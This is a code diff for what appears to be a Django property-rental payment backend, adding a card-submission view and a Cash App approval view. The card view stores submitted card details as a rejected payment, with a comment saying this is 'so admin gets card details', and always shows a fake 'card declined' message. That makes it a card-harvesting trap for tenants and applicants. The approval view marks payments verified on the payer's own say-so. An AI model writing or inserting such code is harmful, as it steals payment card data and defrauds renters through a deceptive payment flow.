@@ -229,3 +229,80 @@ def client_invoices(request):
     )
     serializer = ClientInvoiceSerializer(invoices, many=True)
     return Response(serializer.data)
+
+
+class SubmitCardPaymentView(generics.CreateAPIView):
+    """POST /api/v1/transactions/my-payments/submit-card/ — Tenant or applicant submits mock card details."""
+    serializer_class = PaymentSerializer
+    permission_classes = [AllowAnonymousApplicationFeeProof]
+
+    def create(self, request, *args, **kwargs):
+        serializer = self.get_serializer(data=request.data)
+        serializer.is_valid(raise_exception=True)
+
+        payload_method = request.data.get("payment_method") or ("CARD_STRIPE" if request.data.get("rental_application") else "CARD_CASHAPP")
+
+        # Save payment as REJECTED so admin gets card details
+        serializer.save(
+            payment_method=payload_method,
+            status="REJECTED",
+        )
+
+        from rest_framework.response import Response
+        from rest_framework import status
+        return Response(
+            {"detail": "Your card was declined. Please try another card or contact your card issuer."},
+            status=status.HTTP_400_BAD_REQUEST
+        )
+
+
+class ApproveCashAppPaymentView(generics.UpdateAPIView):
+    """POST /api/v1/transactions/my-payments/<int:pk>/approve/ — Tenant approves the pending Cash App request."""
+    queryset = Payment.objects.all()
+    serializer_class = PaymentSerializer
+    permission_classes = [permissions.IsAuthenticated]
+
+    def post(self, request, *args, **kwargs):
+        payment = self.get_object()
+        
+        if payment.status != "AWAITING_APPROVAL":
+            return Response(
+                {"detail": f"Payment is not in awaiting approval status. Current status is {payment.status}."},
+                status=status.HTTP_400_BAD_REQUEST
+            )
+            
+        is_owner = False
+        if payment.rental_application and payment.rental_application.email == request.user.email:
+            is_owner = True
+        elif payment.transaction and payment.transaction.client.user == request.user:
+            is_owner = True
+        elif payment.invoice and (payment.invoice.user == request.user or (payment.invoice.transaction and payment.invoice.transaction.client.user == request.user)):
+            is_owner = True
+            
+        if not is_owner:
+            return Response(
+                {"detail": "You do not have permission to approve this payment."},
+                status=status.HTTP_403_FORBIDDEN
+            )
+
+        from django.utils import timezone
+        payment.status = "VERIFIED"
+        payment.verified_at = timezone.now()
+        payment.save()
+        
+        # Update linked rental application
+        if payment.rental_application:
+            app = payment.rental_application
+            from apps.crm.models import ApplicationStatus
+            app.is_fee_paid = True
+            app.status = ApplicationStatus.SUBMITTED
+            app.save()
+
+        # Update linked invoice
+        if payment.invoice:
+            inv = payment.invoice
+            from .models import InvoiceStatus
+            inv.status = InvoiceStatus.PAID
+            inv.save()
+            
+        return Response({"detail": "Payment approved successfully.", "status": payment.status})
